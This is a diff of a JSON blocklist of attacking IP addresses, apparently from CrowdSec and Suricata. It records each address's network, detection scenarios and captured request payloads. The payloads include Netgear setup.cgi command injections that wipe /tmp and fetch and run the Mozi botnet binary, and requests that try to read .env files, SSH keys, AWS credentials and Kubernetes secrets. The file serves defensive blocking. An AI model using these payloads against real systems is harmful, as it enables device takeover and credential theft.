@@ -1,39 +1,18 @@
 {
-  "generated_at": "2026-10-23T12:00:00Z",
+  "generated_at": "2026-10-24T00:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 48,
-    "v4": 48,
+    "total": 47,
+    "v4": 47,
     "v6": 0
   },
   "items": [
     {
-      "ip": "172.180.64.72",
-      "family": "v4",
-      "first_seen": "2026-10-16T14:00:00Z",
-      "last_seen": "2026-10-16T14:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.160.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /owa/auth/logon.aspx"
-      ]
-    },
-    {
       "ip": "39.34.143.222",
       "family": "v4",
       "first_seen": "2026-10-16T13:00:00Z",
-      "last_seen": "2026-10-16T13:00:00Z",
+      "last_seen": "2026-10-23T15:00:00Z",
       "scenarios": [
         "crowdsec/http-cve-probing",
         "crowdsec/netgear_rce",
@@ -49,42 +28,6 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "20.214.147.109",
-      "family": "v4",
-      "first_seen": "2026-10-16T13:00:00Z",
-      "last_seen": "2026-10-16T13:00:00Z",
-      "scenarios": [
-        "crowdsec/http-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.192.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /wp-X1s2e6h3p7.php",
-        "GET /wp-logis.php",
-        "GET /wp-fxxxx.php",
-        "GET /wp-good.php",
-        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-        "GET /this_is_a_new_hello_world.php",
-        "GET /3PJcpMFsD8B.php",
-        "GET /z70.php",
-        "GET /1.php?p=",
-        "GET /radio.php",
-        "GET /BDKR28WP.php",
-        "GET /z60.php?p=",
-        "GET /ebkid.php",
-        "GET /133.php",
-        "GET /cae.php"
       ]
     },
     {
@@ -736,7 +679,7 @@
       "ip": "137.59.218.84",
       "family": "v4",
       "first_seen": "2026-10-20T07:00:00Z",
-      "last_seen": "2026-10-20T07:00:00Z",
+      "last_seen": "2026-10-23T15:00:00Z",
       "scenarios": [
         "crowdsec/http-cve-probing",
         "crowdsec/netgear_rce",
@@ -1332,12 +1275,14 @@
       "ip": "92.154.95.236",
       "family": "v4",
       "first_seen": "2026-10-22T07:00:00Z",
-      "last_seen": "2026-10-22T07:00:00Z",
+      "last_seen": "2026-10-23T15:00:00Z",
       "scenarios": [
-        "crowdsec/http-technology-probing"
+        "crowdsec/http-technology-probing",
+        "suricata/SURICATA HTTP Request unrecognized authorization method"
       ],
       "sources": [
-        "crowdsec"
+        "crowdsec",
+        "suricata"
       ],
       "asn": "3215",
       "asn_name": "AS3215 Orange S.A.",
@@ -1452,8 +1397,9 @@
       "ip": "34.62.80.242",
       "family": "v4",
       "first_seen": "2026-10-23T07:00:00Z",
-      "last_seen": "2026-10-23T07:00:00Z",
+      "last_seen": "2026-10-23T13:00:00Z",
       "scenarios": [
+        "crowdsec/http-admin-interface-probing",
         "crowdsec/http-bad-user-agent",
         "crowdsec/http-crawl-non_statics",
         "crowdsec/http-dos-swithcing-ua",
@@ -1471,26 +1417,26 @@
         "mwl:cloud=\"gcp\""
       ],
       "payloads": [
-        "GET /.env?import&url&inline",
-        "GET /api/orders/..%2F..%2F.env",
-        "GET /api/v1/.env",
-        "GET /__vite_rsc_findSourceMapURL?filename=file:///proc/self/environ&environmentName=rsc",
-        "GET /__vite_rsc_findSourceMapURL?filename=file:///app/.env&environmentName=rsc",
-        "GET /@fs/proc/self/cmdline?raw??",
-        "GET /__vite_rsc_findSourceMapURL?filename=file:///root/.aws/credentials&environmentName=rsc",
+        "GET /.envrc",
+        "GET /lerna.json",
+        "GET /.ssh/id_ed25519",
+        "GET /railway.json",
+        "GET /.amplifyrc",
+        "GET /supabase/config.toml",
+        "GET /railway.toml",
+        "GET /.gitlab-ci.yml",
         "GET /",
         "GET /robots.txt",
         "GET /sitemap.xml",
         "GET /sitemap_index.xml",
+        "GET /[REDACTED_DOMAIN]",
+        "GET /tpdp51zpk63djq419x21",
+        "GET /ojfdnjaud1n003va0i6z",
+        "POST /_next",
+        "POST /graphql",
+        "GET /service-account.json",
         "POST /",
-        "GET /tskq0lhmpaowkgwv30fb",
-        "GET /b0hhyhs1qqadkibadru1",
-        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
-        "GET /@fs/var/run/secrets/kubernetes.io/serviceaccount/ca.crt?raw??",
-        "GET /@fs/app/.env.local?import&raw??",
-        "GET /.env.supabase",
-        "GET /@fs/app/.env?import&raw??",
-        "GET /@fs/src/.env?import&raw??"
+        "GET /.env.supabase"
       ]
     },
     {
@@ -1530,6 +1476,37 @@
         "GET /an.php",
         "GET /index/function.php",
         "GET /randkeyword.PhP7"
+      ]
+    },
+    {
+      "ip": "157.230.239.201",
+      "family": "v4",
+      "first_seen": "2026-10-23T21:00:00Z",
+      "last_seen": "2026-10-23T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "157.230.224.0/20",
+      "payloads": [
+        "HEAD /store/",
+        "HEAD /shop/",
+        "HEAD /backup/",
+        "HEAD /site1/",
+        "HEAD /web/",
+        "HEAD /en/",
+        "HEAD /fr/",
+        "HEAD /",
+        "HEAD /cms/",
+        "HEAD /home/",
+        "HEAD /blog2/",
+        "HEAD /old/",
+        "HEAD /wordpress/"
       ]
     }
   ]
